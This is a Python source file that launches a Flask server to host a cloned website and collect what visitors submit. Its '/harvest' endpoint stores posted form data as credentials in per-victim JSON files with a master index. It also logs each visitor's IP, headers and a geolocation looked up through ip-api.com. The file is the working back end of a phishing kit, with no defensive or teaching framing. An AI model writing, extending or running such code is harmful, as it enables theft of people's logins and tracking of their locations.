import os
import sys
import subprocess
import time
import atexit
import signal
import socket

def launch_flask_server(site_root, main_file_rel, site_credentials_dir, port=8080):
    os.makedirs(site_credentials_dir, exist_ok=True)

    server_script = f"""
from flask import Flask, request, send_file, send_from_directory, jsonify, abort, make_response
import os, json, datetime
import re

app = Flask(__name__)
SITE_ROOT = r"{os.path.abspath(site_root)}"
CREDS_DIR = r"{os.path.abspath(site_credentials_dir)}"

def get_geoip_data(ip):
    try:
        import requests
        response = requests.get(f"http://ip-api.com/json/{{ip}}", timeout=2)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                return {{
                    'country': data.get('country'),
                    'country_code': data.get('countryCode'),
                    'region': data.get('regionName'),
                    'city': data.get('city'),
                    'zip': data.get('zip'),
                    'lat': data.get('lat'),
                    'lon': data.get('lon'),
                    'timezone': data.get('timezone'),
                    'isp': data.get('isp'),
                    'org': data.get('org'),
                    'as': data.get('as')
                }}
    except:
        pass
    return None

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    return request.remote_addr

def get_client_info():
    client_ip = get_client_ip()
    
    info = {{
        'ip': client_ip,
        'remote_addr': request.remote_addr,
        'x_forwarded_for': request.headers.get('X-Forwarded-For'),
        'x_real_ip': request.headers.get('X-Real-IP'),
        'user_agent': request.headers.get('User-Agent'),
        'accept_language': request.headers.get('Accept-Language'),
        'referer': request.headers.get('Referer'),
        'accept': request.headers.get('Accept'),
        'accept_encoding': request.headers.get('Accept-Encoding'),
        'host': request.headers.get('Host'),
        'origin': request.headers.get('Origin'),
        'timestamp': str(datetime.datetime.now())
    }}
    
    geo_data = get_geoip_data(client_ip)
    if geo_data:
        info['geo'] = geo_data
    
    return info

def extract_username_from_data(data):
    username_keys = ['username', 'user', 'email', 'login', 'user_id', 'name', 'account']
    for key in username_keys:
        if key in data and data[key] and str(data[key]).strip():
            username = str(data[key]).strip()
            # Clean the username for filename safety
            username = re.sub(r'[<>:"/\\\\|?*]', '_', username)
            username = username.replace(' ', '_')
            if len(username) > 50:
                username = username[:50]
            return username
    return "unknown"

def save_credentials(data):
    os.makedirs(CREDS_DIR, exist_ok=True)
    
    # Extract username from data
    username = extract_username_from_data(data)
    
    # Get site name from directory name
    site_name = os.path.basename(CREDS_DIR)
    
    # Generate timestamp with microseconds for uniqueness
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f")[:-3]
    
    # Create safe filename
    safe_username = "".join(c for c in username if c.isalnum() or c in '._-')
    filename = f"{{site_name}}_{{safe_username}}_{{timestamp}}.json"
    creds_file = os.path.join(CREDS_DIR, filename)
    
    # Create the credential entry
    entry = {{
        "id": filename.replace('.json', ''),
        "timestamp": str(datetime.datetime.now()),
        "data": data,
        "client_info": get_client_info()
    }}
    
    # Save to individual file
    with open(creds_file, 'w') as f:
        json.dump(entry, f, indent=2)
    
    # Update master index file
    index_file = os.path.join(CREDS_DIR, "all_credentials_index.json")
    try:
        if os.path.exists(index_file):
            with open(index_file, 'r') as f:
                index_data = json.load(f)
        else:
            index_data = []
    except:
        index_data = []
    
    # Create summary for index
    data_summary = {{}}
    for key, value in data.items():
        if isinstance(value, (str, int, float, bool)):
            val_str = str(value)
            data_summary[key] = val_str[:50] + "..." if len(val_str) > 50 else val_str
    
    index_entry = {{
        "file": filename,
        "timestamp": str(datetime.datetime.now()),
        "username": username,
        "site": site_name,
        "data_summary": data_summary
    }}
    
    index_data.append(index_entry)
    with open(index_file, 'w') as f:
        json.dump(index_data, f, indent=2)
    
    print(f"[*] Credential saved to {{filename}}")
    return filename

@app.route('/')
def index():
    index_path = os.path.join(SITE_ROOT, 'index.html')
    if os.path.isfile(index_path):
        return serve_html_file('index.html')
    for root, dirs, files in os.walk(SITE_ROOT):
        for f in files:
            if f.lower().endswith('.html'):
                rel_path = os.path.relpath(os.path.join(root, f), SITE_ROOT)
                return serve_html_file(rel_path)
    return abort(404)

@app.route('/<path:path>')
def serve_any_file(path):
    abs_path = os.path.abspath(os.path.join(SITE_ROOT, path))
    if not abs_path.startswith(SITE_ROOT):
        return abort(403)
    if os.path.isdir(abs_path):
        index_file = os.path.join(abs_path, 'index.html')
        if os.path.isfile(index_file):
            rel_path = os.path.relpath(index_file, SITE_ROOT)
            return serve_html_file(rel_path)
        return abort(404)
    if abs_path.lower().endswith('.html') and os.path.isfile(abs_path):
        rel_path = os.path.relpath(abs_path, SITE_ROOT)
        return serve_html_file(rel_path)
    if os.path.isfile(abs_path):
        return send_from_directory(SITE_ROOT, path)
    return abort(404)

def serve_html_file(relpath):
    abs_path = os.path.join(SITE_ROOT, relpath)
    if not os.path.isfile(abs_path):
        return abort(404)
    response = make_response(send_file(abs_path))
    response.headers["Content-Type"] = "text/html; charset=utf-8"
    response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
    return response

@app.route('/harvest', methods=['POST'])
def harvest():
    try:
        data = request.get_json(silent=True)
        if not data or not isinstance(data, dict) or not data:
            data = request.form.to_dict()
        if (not data or not isinstance(data, dict) or not data) and request.data:
            data = request.data.decode('utf-8', errors='ignore')
        if data and isinstance(data, dict) and data:
            filename = save_credentials(data)
            return jsonify({{"status": "success", "file": filename}}), 200
        elif isinstance(data, str) and data.strip():
            filename = save_credentials({{"raw": data.strip()}})
            return jsonify({{"status": "raw_saved", "file": filename}}), 200
        else:
            return jsonify({{"status": "empty"}}), 400
    except Exception as e:
        import traceback
        print("[*] Harvest Exception:", str(e))
        print(traceback.format_exc())
        return jsonify({{"status": "error", "message": str(e)}}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port={port}, debug=False)
"""
    proc = subprocess.Popen(
        [sys.executable, "-c", server_script],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        stdin=subprocess.PIPE
    )

    def cleanup():
        try:
            if proc.poll() is None:
                proc.terminate()
                proc.wait(timeout=1)
        except:
            pass

    atexit.register(cleanup)
    signal.signal(signal.SIGINT, lambda *_: cleanup() or sys.exit(0))

    for _ in range(30):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            if s.connect_ex(('localhost', port)) == 0:
                return proc
        time.sleep(0.3)

    cleanup()
    raise RuntimeError("Flask server failed to start")
